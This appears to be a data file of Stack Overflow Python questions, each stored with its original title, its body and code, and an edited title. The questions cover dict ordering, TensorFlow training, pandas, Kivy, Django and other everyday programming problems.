Dictionaries are ordered in CPython 3.6," Dictionaries are ordered in Python 3.6 (under the CPython implementation at least) unlike in previous incarnations. This seems like a substantial change, but it's only a short paragraph in the documentation. It is described as a CPython implementation detail rather than a language feature, but also implies this may become standard in the future.How does the new dictionary implementation perform better than the older one while preserving element order?Here is the text from the documentation:dict() now uses a compact representation pioneered by PyPy. The memory usage of the new dict() is between 20% and 25% smaller compared to Python 3.5. PEP 468 (Preserving the order of **kwargs in a function.) is implemented by this. The order-preserving aspect of this new implementation is considered an implementation detail and should not be relied upon (this may change in the future, but it is desired to have this new dict implementation in the language for a few releases before changing the language spec to mandate order-preserving semantics for all current and future Python implementations; this also helps preserve backwards-compatibility with older versions of the language where random iteration order is still in effect, e.g. Python 3.5). (Contributed by INADA Naoki in issue 27350. Idea originally suggested by Raymond Hettinger.)Update December 2017: dicts retaining insertion order is guaranteed for Python 3.7 <code> ",Are dictionaries ordered in Python 3.6+?
Dictionaries are ordered in Python 3.6+," Dictionaries are ordered in Python 3.6 (under the CPython implementation at least) unlike in previous incarnations. This seems like a substantial change, but it's only a short paragraph in the documentation. It is described as a CPython implementation detail rather than a language feature, but also implies this may become standard in the future.How does the new dictionary implementation perform better than the older one while preserving element order?Here is the text from the documentation:dict() now uses a compact representation pioneered by PyPy. The memory usage of the new dict() is between 20% and 25% smaller compared to Python 3.5. PEP 468 (Preserving the order of **kwargs in a function.) is implemented by this. The order-preserving aspect of this new implementation is considered an implementation detail and should not be relied upon (this may change in the future, but it is desired to have this new dict implementation in the language for a few releases before changing the language spec to mandate order-preserving semantics for all current and future Python implementations; this also helps preserve backwards-compatibility with older versions of the language where random iteration order is still in effect, e.g. Python 3.5). (Contributed by INADA Naoki in issue 27350. Idea originally suggested by Raymond Hettinger.)Update December 2017: dicts retaining insertion order is guaranteed for Python 3.7 <code> ",Are dictionaries ordered in Python 3.6+?
Delete FIFO-file in Python," I have made a function for deleting files: However, when passing a FIFO-filename (without file-extension), this is not accepted by the os-module.Specifically I have a subprocess create a FIFO-file named 'Testpipe'.When calling: It results to False. The file is not in use/open or anything like that. Python runs under Linux.How can you correctly delete a file like that? <code>  def deleteFile(deleteFile): if os.path.isfile(deleteFile): os.remove(deleteFile) os.path.isfile('Testpipe')",How to delete a file without an extension?
Ask why: Python 3.x map/," I am interested in understanding the new language design of Python 3.x.I do enjoy, in Python 2.7, the function map: However, in Python 3.x things have changed: I understand the how, but I could not find a reference to the why. Why did the language designers make this choice, which, in my opinion, introduces a great deal of pain. Was this to arm-wrestle developers in sticking to list comprehensions?IMO, list can be naturally thought as Functors; and I have been somehow been thought to think in this way: <code>  Python 2.7.12In[2]: map(lambda x: x+1, [1,2,3])Out[2]: [2, 3, 4] Python 3.5.1In[2]: map(lambda x: x+1, [1,2,3])Out[2]: <map at 0x4218390> fmap :: (a -> b) -> f a -> f b",Why does map return a map object instead of a list in Python 3?
Tensorflow Nan loss reasons," Perhaps too general a question, but can anyone explain what would cause a Convolutional Neural Network to diverge?Specifics:I am using Tensorflow's iris_training model with some of my own data and keep gettingERROR:tensorflow:Model diverged with loss = NaN.Traceback...tensorflow.contrib.learn.python.learn.monitors.NanLossDuringTrainingError: NaN loss during training.Traceback originated with line: I've tried adjusting the optimizer, using a zero for learning rate, and using no optimizer. Any insights into network layers, data size, etc is appreciated. <code>  tf.contrib.learn.DNNClassifier(feature_columns=feature_columns, hidden_units=[300, 300, 300], #optimizer=tf.train.ProximalAdagradOptimizer(learning_rate=0.001, l1_regularization_strength=0.00001), n_classes=11, model_dir=""/tmp/iris_model"")",Deep-Learning Nan loss reasons
Return last character of string in python," I want to print the last character of string in python reading from the file.I am calling as str[-1] but it is not working as expected.t.txt contains My code is But it is not printing anything. <code>  Do not laugh please! 9 Are you kidding me? 4 with open('t.txt', 'r') as f: for line in f: print(line) print(line[-1]) # break",Why does [-1] not return the last character of the line in a file?
How can I change the (locale) thousands separator in Python?," I'd like to change the thousands separator such that {:,}.format(1234) in Python uses a different character. The separator should be '\u066c'.How can I set this without affecting any other locals settings?EDIT: Any other suggestion for a unimposing separator viable in a fixed with font is welcome! <code> ",How can I change the (locale) thousands separator in Python to Arabic Unicode separator?
Changing accuracy of CNN training with Tensor Flow for MNIST handwritten digits," I'm following the tutorial ""Deep MNIST for Experts"", https://www.tensorflow.org/versions/r0.11/tutorials/mnist/pros/index.html#deep-mnist-for-expertsUsing Convolutional Neural Networks, I get an accuracy of 93.49%. Which is in fact low and I'm trying to improve it, but I have a doubt. According to the tutorial, The train accuracy is logged after every 100 iterations and seeing the accuracy, it keeps oscillating like increasing and then decreasing. Is there any reason for that? Or is it normal? Then why so? Also, what kind of variables I can change to improve the final accuracy? I've tried changing the learning rate variable already. <code>  for i in range(20000): batch = mnist.train.next_batch(50) if i%100 == 0: train_accuracy = accuracy.eval(feed_dict={x:batch[0], y_: batch[1], keep_prob: 1.0}) print(""step %d, training accuracy %g""%(i, train_accuracy)) train_step.run(feed_dict={x: batch[0], y_: batch[1], keep_prob: 0.5}) step 100, training accuracy 0.1step 200, training accuracy 0.13step 300, training accuracy 0.12step 400, training accuracy 0.08step 500, training accuracy 0.12step 600, training accuracy 0.05step 700, training accuracy 0.09step 800, training accuracy 0.1step 900, training accuracy 0.12step 1000, training accuracy 0.09step 1100, training accuracy 0.11step 1200, training accuracy 0.09step 1300, training accuracy 0.11step 1400, training accuracy 0.06step 1500, training accuracy 0.09step 1600, training accuracy 0.14step 1700, training accuracy 0.07step 1800, training accuracy 0.08......step 19800, training accuracy 0.14step 19900, training accuracy 0.07",Oscillating accuracy of CNN training with Tensor Flow for MNIST handwritten digits
Python with selenium: Is it possible to refresh frame instead of the whole page?," If selenium cannot refresh frame, I'm working on a web page which has nested frames. The structure is basically:webpage -> frame A -> frame B -> frame C I need to refresh frame C constantly. I'm wondering if selenium can achieve this. As far as I can test, the refresh() function refreshes the whole page.The annoying part is that the only button that can refresh frame C resides on frame B, so currently I have to do the following loop: If selenium cannot refresh frame, I'm wondering if there is a better way to switch between frame B and C? I really don't want to go to default content and frame A again and again... I feel there should be a way to preserve the web element of frame B and frame C. But I'm not sure how to do it. Thank you very much! <code>  while True: browser.switch_to_default_content() WebDriverWait(browser, 10).until(EC.frame_to_be_available_and_switch_to_it((""frame A""))) WebDriverWait(browser, 10).until(EC.frame_to_be_available_and_switch_to_it((""frame B""))) browser.find_element_by_css_selector(""refresh_button"").click() WebDriverWait(browser, 10).until(EC.frame_to_be_available_and_switch_to_it((""frame C"")))",Python with Selenium: Is it possible to refresh frame instead of the whole page?
"python syntax: what does the ""variable //= a value"" syntax mean?"," I came across with the code syntax d //= 2 where d is a variable. This is not a part of any loop, I don't quite get the expression. Can anybody enlighten me please?  <code> ","What does the ""variable //= a value"" syntax mean in Python?"
Remotely connect to MySQL with Pytho mysql.connector," The following code (ran from a different machine than the mysql server, within the same LAN), to locally connect to MySQL database using Python3 and mysql.connector works: However, the following code, to remotely connect to the same database, does NOT work: Instead, I receive the following error: Here is an extract of my my.cnf file: So, here is what currently works:Connect locally to the databse using 192.168.0.24:3309 address, so I am sure the problem does not come from 'privileges granting' or any login/password/port error.Connect remotely via phpmyadmin using http://imaginarywebsite.ddns.net/phpmyadmin, so I am sure the problem does not come from my DNS server.And here are my 3 questions : Any Idea where the problem can come from?Should using SSH connection be a solution to my problem?If SSH is the solution, is it possible to use SSH parameters through mysql.connector since it does not seem to be presented in the official documentation?Thanks.  <code>  import mysql.connectorcnx = mysql.connector.connect(host='192.168.0.24', database='import_test',user='user_builder', password='password***', port=3309) import mysql.connectorcnx = mysql.connector.connect(host='http://imaginarywebsite.ddns.net', database='import_test',user='user_builder', password='password***', port=3309) File ""C:\Users\****\AppData\Roaming\Python\Python34\site-packages\mysql\connector\network.py"", line 464, in open_connection errno=2003, values=(self.get_address(), _strioerror(err)))mysql.connector.errors.InterfaceError: 2003: Can't connect to MySQL server on 'http://imaginarywebsite.ddns.net:3309' (11004 getaddrinfo failed) !includedir /etc/mysql/conf.d/!includedir /etc/mysql/mysql.conf.d/[mysqld]innodb_buffer_pool_size=4Ginnodb_log_file_size=1024Minnodb_read_io_threads=64innodb_write_io_threads=64innodb_io_capacity=7000innodb_thread_concurrency=0port = 3309bind-address = 0.0.0.0",Remotely connect to MySQL with Python mysql.connector
"Celery, Group task AttributeError: 'NoneType' object has no attribute 'app'"," I am trying to run a group of celery tasks as follows: The task is executed partly and in the end throws following error: You are welcome to help if you have any ideas. Thank you! <code>  @shared_taskdef run_sms_task(smstask_id): smstask = SmsTask.objects.get(id = smstask_id) if smstask: phones = [] for user in smstask.userlist.users.all(): phones.append(user.profile.phone) g = group(send_sms_async(phone, smstask.text) for phone in phones) g.apply_async() smstask.status = 3 smstask.save() [2016-11-01 13:42:03,362: ERROR/MainProcess] Task sms_center.tasks.run_sms_task[d575fb59-6b0a-4ea6-851f-0902ef6bd7b9] raised unexpected: AttributeError(""'NoneType' object has no attribute 'app'"",)Traceback (most recent call last): File ""/home/alexander/.pyenv/versions/d/lib/python3.5/site-packages/celery/app/trace.py"", line 240, in trace_task R = retval = fun(*args, **kwargs) File ""/home/alexander/.pyenv/versions/d/lib/python3.5/site-packages/celery/app/trace.py"", line 438, in __protected_call__ return self.run(*args, **kwargs) File ""/home/alexander/PycharmProjects/d/sms_center/tasks.py"", line 25, in run_sms_task g.apply_async() File ""/home/alexander/.pyenv/versions/d/lib/python3.5/site-packages/celery/canvas.py"", line 502, in apply_async type = self.type File ""/home/alexander/.pyenv/versions/d/lib/python3.5/site-packages/celery/canvas.py"", line 569, in type return self.app.tasks[self['task']] File ""/home/alexander/.pyenv/versions/d/lib/python3.5/site-packages/celery/canvas.py"", line 560, in app return self._app or (self.tasks[0].app if self.tasks else current_app)AttributeError: 'NoneType' object has no attribute 'app'","Celery, Group task, AttributeError: 'NoneType' object has no attribute 'app'"
Create text area (textEdit) with line number in PyQt 5," I want to create textEdit with line number on the left side in PyQt like Notepad++. I tried this adding another textEdit but scrolling is stuck. I searched and found this question, but there is no good solution for it.  <code> ",Create text area (textEdit) with line number in PyQt
How can I count each opened UDP connection made by subprocesses?," I have a Python application which orchestrates calls to an underlying process. The processes are called using subprocess.check_output and they make SNMP calls to remote network devices.For performance monitoring, I would like to count the number of sent SNMP packets which are transmitted. I am primarily interested in the count of the packets. Packet size of request/response would be interesting too, but less important. The aim is to have an idea on the firewall stress this application causes.So, for the sake of argument, let's assume the following silly application: This would cause a new UDP packet to be sent out on port 161.How can I count them in such a case?Here's another version with stubbed functions (could also be a context manager): In this contrived example, it will obviously be 3 calls, as I manually execute the SNMP calls. But in the practical example, the number of SNMP calls is not equal to calls to the subprocess. Sometimes one or more GETs are executed, sometimes it's simple walks (that is, a lot of sequential UDP requests) sometimes it's bulk walks (an unknown amount of requests).So I can't simply monitor the amount of times the application is called. I really have to monitor the UDP requests.Is something like that even possible? If yes, how?It's likely important to know that this runs on Linux as non-root user. But all subprocesses run as the same user. <code>  from subprocess import check_outputoutput = check_output(['snmpget', '-v2c', '-c', 'private', '192.168.1.1', '1.3.6.1.2.1.1.2.0'])print(output) from subprocess import check_calldef start_monitoring(): passdef stop_monitoring(): return 0start_monitoring()check_call(['snmpget', '-v2c', '-c', 'private', '192.168.1.1', '1.3.6.1.2.1.1.2.0'])check_call(['snmpget', '-v2c', '-c', 'private', '192.168.1.1', '1.3.6.1.2.1.1.2.0'])check_call(['snmpget', '-v2c', '-c', 'private', '192.168.1.1', '1.3.6.1.2.1.1.2.0'])num_connections = stop_monitoring()assert num_connections == 3",How can I count each UDP packet sent out by subprocesses?
How to plot a jointplot with 'hue' parameter," I would like to have the plot of the following command line: if the parameter 'hue' was implemented in jointplot. How can I do this?Maybe superposing two joint plots? <code>  import numpy as np, pandas as pdimport seaborn as sns; sns.set(style=""white"", color_codes=True)tips = sns.load_dataset(""tips"")g = sns.jointplot(x=""total_bill"", y=""tip"", data=tips, hue= 'sex')",How to plot a jointplot with 'hue' parameter in seaborn
Python : write text to file line by line," I'm trying to write some text to a file, and here's what i tried : And I get an empty file.How can I do this? <code>  text = ""Lorem Ipsum is simply dummy text of the printing and typesetting "" \ ""industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s,"" \ "" when an unknown printer took a galley of type and scrambled it to make a type specimen book.""target = open(""file"", 'wb')target.writelines(text)",Write text to file line by line
Congruency Table in Pandas (Pearson Correlation between every row for every row)," With the pandas dataframe below, taken from a dict of dict: I'd like to form a new pandas DataFrame with the results of a Pearson correlation between rows for every row, excluding Pearson correlations between the same rows (correlating A with itself should just be NaN. This is spelled out as a dict of dicts here: where NaN is just numpy.nan. Is there a way to do this as an operation within pandas without iterating through a dict of dicts? I have ~76million pairs, so a non-iterative approach would be great, if one exists. <code>  import numpy as npimport pandas as pdfrom scipy.stats import pearsonrNaN = np.nandd ={'A': {'A': '1', 'B': '2', 'C': '3'}, 'B': {'A': '4', 'B': '5', 'C': '6'}, 'C': {'A': '7', 'B': '8', 'C': '9'}}df_link_link = pd.DataFrame.from_dict(dd, orient='index') dict_congruent = {'A': {'A': NaN, 'B': pearsonr([NaN,2,3],[4,5,6]), 'C': pearsonr([NaN,2,3],[7,8,9])}, 'B': {'A': pearsonr([4,NaN,6],[1,2,3]), 'B': NaN, 'C': pearsonr([4,NaN,6],[7,8,9])}, 'C': {'A': pearsonr([7,8,NaN],[1,2,3]), 'B': pearsonr([7,8,NaN],[4,5,6]), 'C': NaN }}",Congruency Table in Pandas (Pearson Correlation between each row for every row pair)
Saving statmodels Tukey hsd into a Python panda dataframe," I am looking for a way to save the results to save the results of the Tukeyhsd into a pandas dataframe. see below: <code>  import matplotlib.pyplot as pltimport statsmodels.formula.api as smfimport statsmodels.stats.multicomp as multi mcDate = multi.MultiComparison(df['Glucose'], df['Date']) Results = mcDate.tukeyhsd() print(Results) Multiple Comparison of Means - Tukey HSD,FWER=0.05=============================================group1 group2 meandiff lower upper reject--------------------------------------------- A B 20.35 7.388 33.312 True A C -3.85 -16.812 9.112 False B C -24.2 -37.162 -11.238 True ---------------------------------------------",Saving statmodels Tukey hsd into a Python pandas dataframe
pandas - number of unique rows in dataframe," How can I count number of occurrences of each unique row in a DataFrame? And I would like to obtain <code>  df = {'x1': ['A','B','A','A','B','A','A','A'], 'x2': [1,3,2,2,3,1,2,3]}df = pd.DataFrame(df)df x1 x20 A 11 B 32 A 23 A 24 B 35 A 16 A 27 A 3 x1 x2 count 0 A 1 21 A 2 32 A 3 13 B 3 2",pandas - number of unique rows occurrences in dataframe
How to search common character patterns in exact same order in multiple strings in python?," I am writing a python script where I have multiple strings.For example: In all these three strings, they have one sub string in common which is brown. I want to search it in a way that I want to create a dictionary as: What would be the best way of doing that? Considering that I will have more than 200 strings each time, what would be an easy/efficient way of doing it? <code>  x = ""brownasdfoersjumps""y = ""foxsxzxasis12sa[[#brown""z = ""thissasbrownxc-34a@s;"" dict = {[commonly occuring substring] => [total number of occurrences in the strings provided]}",How to find the longest common substring of multiple strings?
Find the longest common substring of multiple strings in Python," I am writing a python script where I have multiple strings.For example: In all these three strings, they have one sub string in common which is brown. I want to search it in a way that I want to create a dictionary as: What would be the best way of doing that? Considering that I will have more than 200 strings each time, what would be an easy/efficient way of doing it? <code>  x = ""brownasdfoersjumps""y = ""foxsxzxasis12sa[[#brown""z = ""thissasbrownxc-34a@s;"" dict = {[commonly occuring substring] => [total number of occurrences in the strings provided]}",How to find the longest common substring of multiple strings?
kivy: update labels in a separate worker (Process instance)," I do have several screens. One of them (DataScreen) contains 8 labels which should show the current sensor values. Sensors are read by a separate process (which is started from the MainScreen). The process itself is an instance of multiprocessing.Process.I can get a reference to the labels by sensor_labels = self.manager.get_screen('data').lHowever, I cannot figure out how to change them within the subprocess. I can change them from any function which is not a separate process, simply by doing something like: Unfortunately, it seems to be more difficult to pass the reference of the sensor_labels to the worker. If I pass them as argument both processes (kivy and the worker) seem to share the same object (the id is the same). However, if I change label.text = 'New Text' nothing changes in Kivy.Why is the id of both objects the same, but the text is not changed ?And how can I share a Kivy label object with another process ?Here is my working minimal example And the .kv file: <code>  for item in sensor_labels: item.text = 'Update' #! /usr/bin/env python"""""" Reading sensor data""""""from kivy.config import ConfigConfig.set('kivy', 'keyboard_mode', 'multi')from kivy.app import Appfrom kivy.lang import Builderfrom kivy.properties import StringProperty, ObjectProperty, NumericPropertyfrom kivy.uix.label import Labelfrom kivy.uix.screenmanager import ScreenManager, Screenfrom kivy.uix.stacklayout import StackLayoutfrom multiprocessing import Process, Queue, Array# all other modulesimport timeimport numpy as npfrom multiprocessing import Lockclass MainScreen(Screen): def __init__(self, **kwargs): super(MainScreen, self).__init__(**kwargs) self.n_probes = 8 @staticmethod def read_sensors(qu_rx, sensor_labels, lock): while True: if not qu_rx.empty(): message = qu_rx.get() if message == 'STOP': print('Worker: received poison pill') break data = np.random.random() print('ID of labels in worker: {}'.format(id(sensor_labels))) print('Text of labels in worker:') lock.acquire() for label in sensor_labels: label.text = '{0:2f}'.format(data) print(label.text) lock.release() time.sleep(5) def run_worker(self, *args, **kwargs): self.qu_tx_worker = Queue() lock = Lock() # this is a reference to the labels in the DataScreen class self.sensor_labels = self.manager.get_screen('data').l self.worker = Process(target=self.read_sensors, args=(self.qu_tx_worker, self.sensor_labels, lock)) self.worker.daemon = True self.worker.start() def stop_worker(self, *args, **kwargs): self.qu_tx_worker.put('STOP') print('Send poison pill') self.worker.join() print('All worker dead') print('ID of labels in Kivy: {}'.format(id(self.sensor_labels))) print('Label text in Kivy:') for label in self.sensor_labels: print(label.text)class DataScreen(Screen): def __init__(self, **kwargs): layout = StackLayout() super(DataScreen, self).__init__(**kwargs) self.n_probes = 8 self.label_text = [] for i in range(self.n_probes): self.label_text.append(StringProperty()) self.label_text[i] = str(i) self.l = [] for i in range(self.n_probes): self.l.append(Label(id='l_{}'.format(i), text='Start {}'.format(i), font_size='60sp', height=20, width=20, size_hint=(0.5, 0.2))) self.ids.stack.add_widget(self.l[i]) def change_text(self): for item in self.l: item.text = 'Update'Builder.load_file('phapp.kv')class MyApp(App): """""" The settings App is the main app of the pHBot application. It is initiated by kivy and contains the functions defining the main interface. """""" def build(self): """""" This function initializes the app interface and has to be called ""build(self)"". It returns the user interface defined by the Builder. """""" sm = ScreenManager() sm.add_widget(MainScreen()) sm.add_widget(DataScreen()) # returns the user interface defined by the Builder return smif __name__ == '__main__': MyApp().run() <MainScreen>: name: 'main' BoxLayout: orientation: 'vertical' Button: text: 'Start Application' font_size: 40 on_release: root.run_worker() Button: text: 'Stop Application' font_size: 40 on_release: root.stop_worker() Button: text: 'Go to data' font_size: 40 on_release: app.root.current = 'data' Button: text: 'Exit' font_size: 40 on_release: app.stop()<DataScreen>: name: 'data' StackLayout: id: stack orientation: 'lr-tb' BoxLayout: Button: size_hint: (0.5, 0.1) text: 'Update' font_size: 30 on_release: root.change_text() Button: size_hint: (0.5, 0.1) text: 'Back to main menu' font_size: 30 on_release: app.root.current = 'main'",Update labels in a separate worker (Process instance)
Why ast.literal_eval('5 * 7') fails?," Why does the literal evaluation of 5 * 7 fail, while 5 + 7 doesn't? The documentation doesn't explain this.I found that problem after answering this question on SO: Getting the result of a string. <code>  import astprint(ast.literal_eval('5 + 7'))# -> 12print(ast.literal_eval('5 * 7'))# -> Traceback (most recent call last): ...ValueError: malformed node or string: <_ast.BinOp object at ...>",Why does ast.literal_eval('5 * 7') fail?
Why does sast.literal_eval('5 * 7')?," Why does the literal evaluation of 5 * 7 fail, while 5 + 7 doesn't? The documentation doesn't explain this.I found that problem after answering this question on SO: Getting the result of a string. <code>  import astprint(ast.literal_eval('5 + 7'))# -> 12print(ast.literal_eval('5 * 7'))# -> Traceback (most recent call last): ...ValueError: malformed node or string: <_ast.BinOp object at ...>",Why does ast.literal_eval('5 * 7') fail?
Why does ast.literal_eval('5 * 7')?," Why does the literal evaluation of 5 * 7 fail, while 5 + 7 doesn't? The documentation doesn't explain this.I found that problem after answering this question on SO: Getting the result of a string. <code>  import astprint(ast.literal_eval('5 + 7'))# -> 12print(ast.literal_eval('5 * 7'))# -> Traceback (most recent call last): ...ValueError: malformed node or string: <_ast.BinOp object at ...>",Why does ast.literal_eval('5 * 7') fail?
import sklearn.model_selection error: cannot import _minpack," I am trying to import sklearn.model_selection. I have tried to reinstall scikit-learn and anaconda, still not working. Here is the error msg I got:  <code>  ImportError Traceback (most recent call last)<ipython-input-69-e49df3a70ea4> in <module>() 4 get_ipython().magic(u'matplotlib inline') 5 # from sklearn.model_selection import train_test_split----> 6 import sklearn.model_selection/Users/Lu/anaconda/lib/python2.7/site-packages/sklearn/model_selection/__init__.py in <module>()----> 1 from ._split import BaseCrossValidator 2 from ._split import KFold 3 from ._split import GroupKFold 4 from ._split import StratifiedKFold 5 from ._split import TimeSeriesSplit/Users/Lu/anaconda/lib/python2.7/site-packages/sklearn/model_selection/_split.py in <module>() 34 from ..utils.random import choice 35 from ..base import _pprint---> 36 from ..gaussian_process.kernels import Kernel as GPKernel 37 38 __all__ = ['BaseCrossValidator',/Users/Lu/anaconda/lib/python2.7/site-packages/sklearn/gaussian_process/__init__.py in <module>() 11 """""" 12 ---> 13 from .gpr import GaussianProcessRegressor 14 from .gpc import GaussianProcessClassifier 15 from . import kernels/Users/Lu/anaconda/lib/python2.7/site-packages/sklearn/gaussian_process/gpr.py in <module>() 10 import numpy as np 11 from scipy.linalg import cholesky, cho_solve, solve_triangular---> 12 from scipy.optimize import fmin_l_bfgs_b 13 14 from sklearn.base import BaseEstimator, RegressorMixin, clone/Users/Lu/anaconda/lib/python2.7/site-packages/scipy/optimize/__init__.py in <module>() 232 from .optimize import * 233 from ._minimize import *--> 234 from ._root import * 235 from .minpack import * 236 from .zeros import */Users/Lu/anaconda/lib/python2.7/site-packages/scipy/optimize/_root.py in <module>() 17 18 from .optimize import MemoizeJac, OptimizeResult, _check_unknown_options---> 19 from .minpack import _root_hybr, leastsq 20 from ._spectral import _root_df_sane 21 from . import nonlin/Users/Lu/anaconda/lib/python2.7/site-packages/scipy/optimize/minpack.py in <module>() 2 3 import warnings----> 4 from . import _minpack 5 6 import numpy as npImportError: cannot import name _minpack",Cannot import sklearn.model_selection in scikit-learn
Python: subprocess.Popen - No such file or directory," Code: Error: Can someone please advise what is the issue with the above code? <code>  import subprocessprocess = subprocess.Popen('echo 5') Traceback (most recent call last): File ""test.py"", line 3, in <module> process = subprocess.Popen('echo 5') File ""/usr/lib64/python2.6/subprocess.py"", line 642, in __init__ errread, errwrite) File ""/usr/lib64/python2.6/subprocess.py"", line 1238, in _execute_child raise child_exceptionOSError: [Errno 2] No such file or directory",subprocess.Popen - No such file or directory
Apply a style with ttk?," So I am trying to apply a simple style to a labelframe widget with the following code: But when I run this code I get the error message: TclError: Layout Black.TLabelFrame not foundI don't understand what I am doing wrong... <code>  import sysif sys.version_info[0] == 2: # Just checking your Python version to import Tkinter properly. import Tkinter as tk import ttk as ttkelse: import tkinter as tk from tkinter.ttk import ttk as ttkroot = tk.Tk()bls = ttk.Style()bls.configure('Black.TLabelFrame', background=""#222222"")dayframe = ttk.Labelframe(root, style='Black.TLabelFrame', height=200, width=150, relief=tk.SUNKEN, text=""Hello"")dayframe.grid(row=1, column=1, padx=5)root.mainloop()","Solving ""TclError: Layout TLabelFrame not found"""
"""DisallowedHost at /"" django error"," I am setting up my own Django server using this Digital Ocean tutorial. I created the Django framework following each step, and ran the server using this command: When I tried to visit the IP at port 8000, the following error was shown: (IP substituted with X's)Why is this happening? <code>  ./manage.py runserver 0.0.0.0:8000 DisallowedHost at /Invalid HTTP_HOST header: 'XXX.XXX.XXX.XXX:8000'. You may need to add u'XXX.XXX.XXX.XXX' to ALLOWED_HOSTS.","Why is Django throwing error ""DisallowedHost at /""?"
Unable to reset jupyter notebook theme to default," I'm using the jupyter notebook installed with Anaconda (I'm on Mac). Few days ago, I wanted to change the theme to have a dark background, and I followed the instructions here. Namely, I've downloaded the theme custom.css and placed it in ~/.jupyter/custom/. It worked very well. I liked the theme, but I would like to go back to the default one (this one does not show the main toolbar, among other things). I tried to remove the custom.css from its folder, I reset my terminal, but nothing changes! I'm guessing that jupyter keeps a copy of the themes somewhere that I should delete, but I can't find it.I have also tried uninstalling jupyter and reinstalling, following the commands: Again, no change. I'm stuck with my black background theme with no toolbar. <code>  conda update condaconda uninstall ipythonconda install jupyter",How to reset jupyter notebook theme to default?
What is a good practice to check if an environmental variable exists or not in Python?," I want to check my environment for the existence of a variable, say ""FOO"", in Python. For this purpose, I am using the os standard library. After reading the library's documentation, I have figured out 2 ways to achieve my goal:Method 1: Method 2: I would like to know which method, if either, is a good/preferred conditional and why. <code>  if ""FOO"" in os.environ: pass if os.getenv(""FOO"") is not None: pass",What is a good practice to check if an environmental variable exists or not?
How to generate reports in Behave-Phython?," For Java there are external report generation tools like extent-report,testNG. The Junit produces the xml format output for individual feature file. To get a detailed report, I don't see an option or wide approach or solution within the Behave framework.How to produce the reports in Behave, do any other tools or framework needs to be added for the report generation in Behave? <code> ",How to generate reports in Behave-Python?
Python: Extract text by tag in ElementTree," I'm trying to create a function which counts words in pptx document. The problem is that I can't figure out how to find only this kind of tags: <a:t>Some Text</a:t>When I try to: print xmlTree.findall('.//a:t'), it returns SyntaxError: prefix 'a' not found in prefix mapDo you know what to do to make it work?This is the function: <code>  def get_pptx_word_count(filename): import xml.etree.ElementTree as ET import zipfile z = zipfile.ZipFile(filename) i=0 wordcount = 0 while True: i+=1 slidename = 'slide{}.xml'.format(i) try: slide = z.read(""ppt/slides/{}"".format(slidename)) except KeyError: break xmlTree = ET.fromstring(slide) for elem in xmlTree.iter(): if elem.tag=='a:t': #text = elem.getText #num = len(text.split(' ')) #wordcount+=num",SyntaxError: prefix 'a' not found in prefix map
Python Schedule Passing Parameters," How can I pass parameters to schedule?The function I want to get called: How I schedule it: How can I pass a parameter to do(job)? <code>  def job(param1, param2): print(str(param1) + str(param2)) schedule.every(10).minutes.do(job)",Pass parameters to schedule
Sorting an Array in Tensorflow," Let's assume I have an array in TensorFlow: I would like to sort this array by the third column. How do I do this? I am able to sort each column individually using tf.nn.top_k(), which gives me the sorted values and the respective indices. I could use the indices of this third column to reorder the others, but I cannot find a reordering Op.Assuming I want to keep things in-graph (no Python shenanigans):How do I sort (the above array) in TensorFlow?How do I re-order in TensorFlow when I have indices for re-ordering? <code>  [ 0.12300211, 0.51767069, 0.13886075, 0.55363625],[ 0.47279349, 0.50432992, 0.48080254, 0.51576483],[ 0.84347934, 0.44505221, 0.88839239, 0.48857492],[ 0.93650454, 0.43652734, 0.96464157, 0.47236174], ..",Sorting an Array in TensorFlow
Incremental model update pyMC3," Is it possible to incrementally update a model in pyMC3. I can currently find no information on this. All documentation is always working with a priori known data.But in my understanding, a Bayesian model also means being able to update a belief. Is this possible in pyMC3? Where can I find info in this?Thank you :) <code> ",Incremental model update with PyMC3
Matlab Demcmap equivalent for Python (elevation appropriate colormap)," I am looking for a way to get an elevation appropriate colormap for matplotlib.the cmap 'terrain' looks great but the colorscaling isn't based around zero (i.e. if the scale is 0->5000m, the 0->1000m range may be shades of blue, which you would assume to be for below sea-level)for example:The Matlab function equivalent is:demcmapWhat is the best way to get matplotlib to shift a terrain colormap's greens/browns and blues around the zero elevation mark? <code> ",Python equivalent for Matlab's Demcmap (elevation +/- appropriate colormap)
Flask-wtf dyanmic select field with a empty optoin," I want to populate a select field based a query search.But I also want an empty option.This is my current code the result is the desired result is It would be cool if is also not valid if the select option is empty. <code>  form.state.choices=[(s.id, s.name) for s in State.query.all()] <select> <option value=""CA"">California</option> <option value=""FL"">Florida</option> </select> <select><option value=""""></option><option value=""CA"">California</option><option value=""FL"">Florida</option></select>",Flask-wtf dynamic select field with an empty option
How do I reference the data a user enters into my form?," How do I get the data from a WTForms form after submitting it? I want to get the email entered in the form.  <code>  class ApplicationForm(Form): email = StringField()@app.route('/', methods=['GET', 'POST'])def index(): form = ApplicationForm() if form.validate_on_submit(): return redirect('index') return render_template('index.html', form=form) <form enctype=""multipart/form-data"" method=""post""> {{ form.csrf_token }} {{ form.email }} <input type=submit></form>",Get data from WTForms form
Python pandas equvilant to R groupby mutate," So in R when I have a data frame consisting of say 4 columns, call it df and I want to compute the ratio by sum product of a group, I can it in such a way: But in python I need to resort to loops.I know there should be a more elegant way than raw loops in python, anyone got any ideas?  <code>  // generate datadf = data.frame(a=c(1,1,0,1,0),b=c(1,0,0,1,0),c=c(10,5,1,5,10),d=c(3,1,2,1,2));| a b c d || 1 1 10 3 || 1 0 5 1 || 0 0 1 2 || 1 1 5 1 || 0 0 10 2 |// compute sum product ratiodf = df%>% group_by(a,b) %>% mutate( ratio=c/sum(c*d) );| a b c d ratio || 1 1 10 3 0.286 || 1 1 5 1 0.143 || 1 0 5 1 1 || 0 0 1 2 0.045 || 0 0 10 2 0.454 |",Python pandas equivalent to R groupby mutate
Python. Why do we need coroutines?," I've heard about co-routines long ago, but never used them. As I know, co-routines are similar to generators.Why do we need co-routines in Python? <code> ",Why do we need coroutines in python?
Ansible - Remove item in list," I'd like to remove an item from a list, based on another list. My second list: How do I remove 'item3' from this list, to set a new fact?I tried using '-' and union, but this does not end in the desired end result. End goal: <code>  ""my_list_one"": [ ""item1"", ""item2"", ""item3""] ""my_list_two"": [ ""item3""] set_fact: my_list_one: ""{{ my_list_one | union(my_list_two) }}"" ""my_list_one"": [ ""item1"", ""item2""]",Ansible - how to remove an item from a list?
